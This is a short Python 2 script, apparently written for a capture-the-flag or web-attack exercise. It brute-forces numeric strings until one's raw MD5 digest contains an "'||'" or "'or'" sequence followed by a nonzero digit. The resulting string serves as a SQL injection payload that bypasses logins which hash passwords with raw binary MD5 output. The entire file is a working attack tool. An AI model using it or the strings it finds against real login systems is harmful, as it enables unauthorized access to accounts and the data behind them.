from hashlib import md5
import os

def check_md5_str(md5_str):
    # find() will return -1 if not found
    pos1 = md5_str.find("'||'")
    pos2 = md5_str.lower().find("'or'")
    # if found and a char after the string exists and is a digit 1-9
    if pos1 >= 0 and pos1+4 < len(md5_str) and md5_str[pos1+4].isdigit():
        if int(md5_str[pos1+4]) > 0:
            print md5_str
            return True
    if pos2 >= 0 and pos2+4 < len(md5_str) and md5_str[pos2+4].isdigit():
        if int(md5_str[pos2+4]) > 0:
            print md5_str
            return True
    return False

found = True
while found:
    random_str = os.urandom(16).encode('hex')
    i = int(random_str, 16)
    print "new random_str: ", i
    while True:
        if((i%10000000) == 0):
            print i
        attack_str = str(i)
        md5_str = md5(attack_str).digest()
        i = i+1
        if((i%100000000) == 0):
            break # change to a new random string
        if(check_md5_str(md5_str)):
            found = False
            break

print "attack_str found: ", attack_str
